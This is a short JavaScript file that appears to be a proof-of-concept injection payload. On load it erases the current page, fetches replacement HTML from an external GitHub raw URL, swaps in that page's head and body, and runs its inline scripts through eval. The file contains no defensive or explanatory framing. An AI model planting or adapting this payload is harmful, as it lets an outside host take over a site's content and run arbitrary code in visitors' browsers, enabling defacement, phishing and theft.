// Immediately clear the current page content when script loads
document.documentElement.innerHTML = "";

// Function to fetch and inject index2.html content
async function injectContent() {
    try {
        // Fetch the content of index2.html
        const response = await fetch('https://raw.githubusercontent.com/D3FaltXD/FireCompass-Landing/main/poc2.html');
        const content = await response.text();
        
        // Create a temporary div to parse the HTML
        const parser = new DOMParser();
        const doc = parser.parseFromString(content, 'text/html');
        
        // Extract and inject head content first
        const headContent = doc.head.innerHTML;
        document.head.innerHTML = headContent;
        
        // Extract and inject body content
        const bodyContent = doc.body.innerHTML;
        document.body.innerHTML = bodyContent;
        
        // Re-execute scripts that might have been in the original content
        const scripts = document.getElementsByTagName('script');
        Array.from(scripts).forEach(script => {
            if (!script.src && script.textContent) { // Only for inline scripts
                try {
                    eval(script.textContent);
                } catch (e) {
                    console.error('Error executing script:', e);
                }
            }
        });
        
    } catch (error) {
        console.error('Error injecting content:', error);
    }
}

// Execute the injection
injectContent();
